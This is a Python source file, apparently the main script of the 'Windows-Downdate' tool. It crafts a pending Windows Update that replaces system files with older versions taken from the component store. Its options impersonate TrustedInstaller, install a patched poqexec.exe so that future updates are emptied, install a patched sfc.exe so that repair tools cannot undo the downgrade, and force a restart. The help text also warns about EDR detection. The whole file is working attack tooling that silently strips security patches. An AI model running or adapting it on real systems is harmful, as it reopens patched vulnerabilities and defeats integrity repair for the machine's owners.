import argparse
import logging
import os
import sys
from typing import List

from windows_downdate import UpdateFile
from windows_downdate.component_store_utils import retrieve_oldest_files_for_update_files
from windows_downdate.filesystem_utils import Path, is_file_contents_equal
from windows_downdate.privilege_utils import impersonate_trusted_installer, is_administrator
from windows_downdate.system_utils import restart_system
from windows_downdate.update_utils import pend_update, get_empty_pending_xml
from windows_downdate.xml_utils import load_xml, find_child_elements_by_match, get_element_attribute, create_element, \
    append_child_element, ET


logger = logging.getLogger(__name__)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Windows-Downdate: Craft any customized Windows Update")
    parser.add_argument("--config-xml", type=str, required=True, help="Path to the Config.xml file.")
    parser.add_argument("--force-restart", action="store_true", required="--restart-timeout" in sys.argv,
                        help="Flag specifying whether to force an automatic machine restart. "
                             "Update takes place during the restart.")
    parser.add_argument("--restart-timeout", type=int, default=10,
                        help="How much time to wait until the automatic machine restart.")
    parser.add_argument("--elevate", action="store_true",
                        help="Flag specifying whether to elevate to TrustedInstaller. "
                             "Functionality is the same, but smoother with TrustedInstaller. "
                             "Not recommended if facing an EDR!")
    parser.add_argument("--invisible", action="store_true",
                        help="Flag specifying whether to make the downgrade invisible by installing missing updates. "
                             "If not used, and the system has missing updates, the system may not be fully up to date.")
    parser.add_argument("--persistent", action="store_true",
                        help="Flag specifying whether to employ downgrade persistence by emptying future updates. "
                             "If not used, future updates may overwrite the downgrade.")
    parser.add_argument("--irreversible", action="store_true",
                        help="Flag specifying whether to make the downgrade irreversible. "
                             "If not used, repairing tools such as SFC may be able to detect and repair the downgrade.")

    return parser.parse_args()


def init_logger() -> None:
    logger.setLevel(logging.INFO)
    stream_handler = logging.StreamHandler()
    log_format = logging.Formatter('[%(levelname)s] %(message)s')
    stream_handler.setFormatter(log_format)
    logger.addHandler(stream_handler)


def parse_config_xml(config_file_path: str) -> List[UpdateFile]:

    config_xml = load_xml(config_file_path)

    update_files = []
    for update_file in find_child_elements_by_match(config_xml, "./UpdateFilesList/UpdateFile"):
        destination_file = get_element_attribute(update_file, "destination")
        destination_file_obj = Path(destination_file)

        source_file = get_element_attribute(update_file, "source")
        source_file_obj = Path(source_file)

        # If the source does not exist, retrieve its oldest version from the component store
        if not source_file_obj.exists:
            should_retrieve_oldest = True
        else:
            should_retrieve_oldest = False

        update_file_obj = UpdateFile(source_file_obj, destination_file_obj, should_retrieve_oldest)
        update_files.append(update_file_obj)

    if not update_files:
        raise Exception("Empty update files post config file parsing. Make sure to have a correct config file")

    return update_files


def craft_downgrade_xml(update_files: List[UpdateFile]) -> ET.ElementTree:
    downgrade_xml = get_empty_pending_xml()
    poq_element = find_child_elements_by_match(downgrade_xml, "./POQ")[0]  # Post reboot POQ is always at index 0

    for update_file in update_files:

        # Let's make sure we do not update files that are the same
        if is_file_contents_equal(update_file.source_path_obj.full_path, update_file.destination_path_obj.full_path):
            logger.info(f"Skipping update of {update_file.destination_path_obj.name},"
                        f" source and destination are the same")
            continue

        hardlink_dict = update_file.to_hardlink_dict()
        hardlink_element = create_element("HardlinkFile", hardlink_dict)
        append_child_element(poq_element, hardlink_element)
        logger.info(f"{update_file.destination_path_obj.full_path} <<-->> {update_file.source_path_obj.full_path}")

    return downgrade_xml


def main() -> None:
    cwd = os.getcwd()
    init_logger()
    args = parse_args()

    logger.info("Starting Windows-Downdate")

    if not is_administrator():
        raise Exception("Windows-Downdate must be run as an Administrator")

    update_files = parse_config_xml(args.config_xml)
    logger.info("Parsed config file")

    if args.elevate:
        impersonate_trusted_installer()
        logger.info("Impersonated TrustedInstaller")

    if args.invisible:
        raise NotImplementedError("Not implemented yet")

    if args.persistent:
        patched_poqexec_path_obj = Path(f"{cwd}\\resources\\PoqExec\\poqexec.exe")
        poqexec_path_obj = Path("C:\\Windows\\System32\\poqexec.exe")
        poqexec_update_file_obj = UpdateFile(patched_poqexec_path_obj, poqexec_path_obj)
        update_files.append(poqexec_update_file_obj)
        logger.info("Added patched PoqExec to update files for persistence")

    if args.irreversible:
        patched_sfc_path_obj = Path(f"{cwd}\\resources\\SFC\\sfc.exe")
        sfc_path_obj = Path("C:\\Windows\\System32\\sfc.exe")
        sfc_update_file_obj = UpdateFile(patched_sfc_path_obj, sfc_path_obj)
        update_files.append(sfc_update_file_obj)
        logger.info("Added patched SFC to update files for irreversible")

    retrieve_oldest_files_for_update_files(update_files)
    logger.info(f"Retrieved oldest files for non-existent update files")

    downgrade_xml = craft_downgrade_xml(update_files)
    downgrade_xml_path = f"{cwd}\\Downgrade.xml"
    downgrade_xml.write(downgrade_xml_path)
    logger.info(f"Written downgrade XML to disk: {downgrade_xml_path}")

    pend_update(downgrade_xml_path)
    logger.info("Pended update with downgrade XML")

    if args.force_restart:
        restart_system(args.restart_timeout)
        logger.info(f"System restart in {args.restart_timeout}")
    else:
        logger.info("You must manually restart the system for the update to take effect")

    logger.info("Ending Windows-Downdate")


if __name__ == '__main__':
    main()
